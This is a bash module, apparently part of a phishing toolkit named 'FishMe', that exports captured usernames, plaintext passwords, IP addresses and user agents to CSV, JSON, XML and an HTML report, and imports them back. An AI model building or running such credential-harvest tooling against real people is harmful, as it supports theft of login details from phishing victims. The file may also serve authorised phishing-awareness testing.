#!/bin/bash

CAPTURE_DIR="${BASE_DIR}/capture"
EXPORT_DIR="${BASE_DIR}/exports"

init_export_manager() {
    mkdir -p "$EXPORT_DIR"
}

export_captures_csv() {
    local output_file="${1:-${EXPORT_DIR}/captures_$(date +%Y%m%d_%H%M%S).csv}"
    local template_filter="${2:-}"
    
    echo "Exporting captures to CSV: $output_file"
    echo "timestamp,username,password,template,ip,user_agent" > "$output_file"
    local count=0
    for capture_file in "${CAPTURE_DIR}"/*.json; do
        if [[ -f "$capture_file" ]]; then
            local template
            template=$(basename "$capture_file" .json)
            
            # Apply template filter if specified
            if [[ -n "$template_filter" ]] && [[ "$template" != "$template_filter" ]]; then
                continue
            fi
            
            # Extract data from JSON
            local timestamp username password ip user_agent
            timestamp=$(jq -r '.timestamp // "N/A"' "$capture_file" 2>/dev/null)
            username=$(jq -r '.username // "N/A"' "$capture_file" 2>/dev/null)
            password=$(jq -r '.password // "N/A"' "$capture_file" 2>/dev/null)
            ip=$(jq -r '.ip // "N/A"' "$capture_file" 2>/dev/null)
            user_agent=$(jq -r '.user_agent // "N/A"' "$capture_file" 2>/dev/null)
            username=$(echo "$username" | sed 's/,/\\,/g')
            password=$(echo "$password" | sed 's/,/\\,/g')
            user_agent=$(echo "$user_agent" | sed 's/,/\\,/g')
            
            echo "${timestamp},${username},${password},${template},${ip},${user_agent}" >> "$output_file"
            ((count++))
        fi
    done
    
    echo "Exported $count captures to $output_file"
}

export_captures_json() {
    local output_file="${1:-${EXPORT_DIR}/captures_$(date +%Y%m%d_%H%M%S).json}"
    local template_filter="${2:-}"
    
    echo "Exporting captures to JSON: $output_file"
    echo "[" > "$output_file"
    
    local first=true
    local count=0
    for capture_file in "${CAPTURE_DIR}"/*.json; do
        if [[ -f "$capture_file" ]]; then
            local template
            template=$(basename "$capture_file" .json)
            
            # Apply template filter if specified
            if [[ -n "$template_filter" ]] && [[ "$template" != "$template_filter" ]]; then
                continue
            fi
            if [[ "$first" == false ]]; then
                echo "," >> "$output_file"
            fi
            first=false
            local capture_data
            capture_data=$(jq --arg template "$template" '. + {template: $template}' "$capture_file" 2>/dev/null)
            echo "  $capture_data" >> "$output_file"
            ((count++))
        fi
    done
    
    echo "" >> "$output_file"
    echo "]" >> "$output_file"
    
    echo "Exported $count captures to $output_file"
}

export_captures_xml() {
    local output_file="${1:-${EXPORT_DIR}/captures_$(date +%Y%m%d_%H%M%S).xml}"
    local template_filter="${2:-}"
    
    echo "Exporting captures to XML: $output_file"
    cat > "$output_file" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<captures>
EOF
    
    # Process all capture JSON files
    local count=0
    for capture_file in "${CAPTURE_DIR}"/*.json; do
        if [[ -f "$capture_file" ]]; then
            local template
            template=$(basename "$capture_file" .json)
            
            # Apply template filter if specified
            if [[ -n "$template_filter" ]] && [[ "$template" != "$template_filter" ]]; then
                continue
            fi
            
            # Extract data from JSON
            local timestamp username password ip user_agent
            timestamp=$(jq -r '.timestamp // "N/A"' "$capture_file" 2>/dev/null)
            username=$(jq -r '.username // "N/A"' "$capture_file" 2>/dev/null)
            password=$(jq -r '.password // "N/A"' "$capture_file" 2>/dev/null)
            ip=$(jq -r '.ip // "N/A"' "$capture_file" 2>/dev/null)
            user_agent=$(jq -r '.user_agent // "N/A"' "$capture_file" 2>/dev/null)
            username=$(echo "$username" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g; s/'"'"'/\&#39;/g')
            password=$(echo "$password" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g; s/'"'"'/\&#39;/g')
            user_agent=$(echo "$user_agent" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g; s/'"'"'/\&#39;/g')
            
            cat >> "$output_file" << EOF
  <capture>
    <template>${template}</template>
    <timestamp>${timestamp}</timestamp>
    <username>${username}</username>
    <password>${password}</password>
    <ip>${ip}</ip>
    <user_agent>${user_agent}</user_agent>
  </capture>
EOF
            ((count++))
        fi
    done
    
    echo "</captures>" >> "$output_file"
    
    echo "Exported $count captures to $output_file"
}

export_captures_html() {
    local output_file="${1:-${EXPORT_DIR}/report_$(date +%Y%m%d_%H%M%S).html}"
    local template_filter="${2:-}"
    
    echo "Exporting captures to HTML report: $output_file"
    cat > "$output_file" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>FishMe Capture Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px; }
        .stats { display: flex; gap: 20px; margin: 20px 0; }
        .stat-box { flex: 1; background: #f8f9fa; padding: 15px; border-radius: 5px; text-align: center; }
        .stat-number { font-size: 24px; font-weight: bold; color: #007bff; }
        .stat-label { color: #666; font-size: 14px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background: #007bff; color: white; }
        tr:hover { background: #f5f5f5; }
        .template-badge { display: inline-block; padding: 4px 8px; background: #007bff; color: white; border-radius: 3px; font-size: 12px; }
        .timestamp { color: #666; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>FishMe Capture Report</h1>
        <p>Generated: $(date)</p>
        
        <div class="stats">
            <div class="stat-box">
                <div class="stat-number" id="total-captures">0</div>
                <div class="stat-label">Total Captures</div>
            </div>
            <div class="stat-box">
                <div class="stat-number" id="unique-ips">0</div>
                <div class="stat-label">Unique IPs</div>
            </div>
            <div class="stat-box">
                <div class="stat-number" id="unique-templates">0</div>
                <div class="stat-label">Templates Used</div>
            </div>
        </div>
        
        <table>
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>Template</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>IP Address</th>
                    <th>User Agent</th>
                </tr>
            </thead>
            <tbody>
EOF
    
    # Process all capture JSON files
    local count=0
    local unique_ips=()
    local unique_templates=()
    
    for capture_file in "${CAPTURE_DIR}"/*.json; do
        if [[ -f "$capture_file" ]]; then
            local template
            template=$(basename "$capture_file" .json)
            
            # Apply template filter if specified
            if [[ -n "$template_filter" ]] && [[ "$template" != "$template_filter" ]]; then
                continue
            fi
            
            # Extract data from JSON
            local timestamp username password ip user_agent
            timestamp=$(jq -r '.timestamp // "N/A"' "$capture_file" 2>/dev/null)
            username=$(jq -r '.username // "N/A"' "$capture_file" 2>/dev/null)
            password=$(jq -r '.password // "N/A"' "$capture_file" 2>/dev/null)
            ip=$(jq -r '.ip // "N/A"' "$capture_file" 2>/dev/null)
            user_agent=$(jq -r '.user_agent // "N/A"' "$capture_file" 2>/dev/null)
            username=$(echo "$username" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')
            password=$(echo "$password" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')
            user_agent=$(echo "$user_agent" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')
            
            cat >> "$output_file" << EOF
                <tr>
                    <td class="timestamp">${timestamp}</td>
                    <td><span class="template-badge">${template}</span></td>
                    <td>${username}</td>
                    <td>${password}</td>
                    <td>${ip}</td>
                    <td>${user_agent}</td>
                </tr>
EOF
            if [[ ! " ${unique_ips[@]} " =~ " ${ip} " ]]; then
                unique_ips+=("$ip")
            fi
            if [[ ! " ${unique_templates[@]} " =~ " ${template} " ]]; then
                unique_templates+=("$template")
            fi
            
            ((count++))
        fi
    done
    cat >> "$output_file" << EOF
            </tbody>
        </table>
    </div>
    
    <script>
        document.getElementById('total-captures').textContent = '${count}';
        document.getElementById('unique-ips').textContent = '${#unique_ips[@]}';
        document.getElementById('unique-templates').textContent = '${#unique_templates[@]}';
    </script>
</body>
</html>
EOF
    
    echo "Exported $count captures to HTML report: $output_file"
}

import_captures_csv() {
    local input_file="$1"
    
    if [[ ! -f "$input_file" ]]; then
        echo "File not found: $input_file"
        return 1
    fi
    
    echo "Importing captures from CSV: $input_file"
    local count=0
    tail -n +2 "$input_file" | while IFS=',' read -r timestamp username password template ip user_agent; do
        if [[ -n "$template" ]]; then
            local capture_file="${CAPTURE_DIR}/${template}.json"
            jq -n \
                --arg timestamp "$timestamp" \
                --arg username "$username" \
                --arg password "$password" \
                --arg ip "$ip" \
                --arg user_agent "$user_agent" \
                '{
                    timestamp: $timestamp,
                    username: $username,
                    password: $password,
                    ip: $ip,
                    user_agent: $user_agent
                }' > "$capture_file"
            
            ((count++))
        fi
    done
    
    echo "Imported captures from CSV"
}

import_captures_json() {
    local input_file="$1"
    
    if [[ ! -f "$input_file" ]]; then
        echo "File not found: $input_file"
        return 1
    fi
    
    echo "Importing captures from JSON: $input_file"
    local count=0
    jq -c '.[]' "$input_file" | while IFS= read -r capture; do
        local template
        template=$(echo "$capture" | jq -r '.template // "unknown"')
        local capture_file="${CAPTURE_DIR}/${template}.json"
        echo "$capture" | jq 'del(.template)' > "$capture_file"
        ((count++))
    done
    
    echo "Imported captures from JSON"
}

list_exports() {
    echo "Available Exports:"
    echo "=================="
    
    if [[ ! -d "$EXPORT_DIR" ]] || [[ -z "$(ls -A "$EXPORT_DIR")" ]]; then
        echo "No exports found."
        return
    fi
    
    local i=1
    for export_file in "${EXPORT_DIR}"/*; do
        if [[ -f "$export_file" ]]; then
            local filename
            filename=$(basename "$export_file")
            local filesize
            filesize=$(du -h "$export_file" | cut -f1)
            local filedate
            filedate=$(stat -c %y "$export_file" 2>/dev/null | cut -d'.' -f1)
            
            printf "  ${GREEN}[%d]${RESET} ${BOLD}%s${RESET} (%s) - %s\n" "$i" "$filename" "$filesize" "$filedate"
            ((i++))
        fi
    done
}

delete_export() {
    local export_name="$1"
    local export_file="${EXPORT_DIR}/${export_name}"
    
    if [[ ! -f "$export_file" ]]; then
        echo "Export not found: $export_name"
        return 1
    fi
    
    rm "$export_file"
    echo "Deleted export: $export_name"
}

export_all_formats() {
    local base_name="${1:-captures_$(date +%Y%m%d_%H%M%S)}"
    
    echo "Exporting captures in all formats..."
    
    export_captures_csv "${EXPORT_DIR}/${base_name}.csv"
    export_captures_json "${EXPORT_DIR}/${base_name}.json"
    export_captures_xml "${EXPORT_DIR}/${base_name}.xml"
    export_captures_html "${EXPORT_DIR}/${base_name}.html"
    
    echo "All exports completed."
}
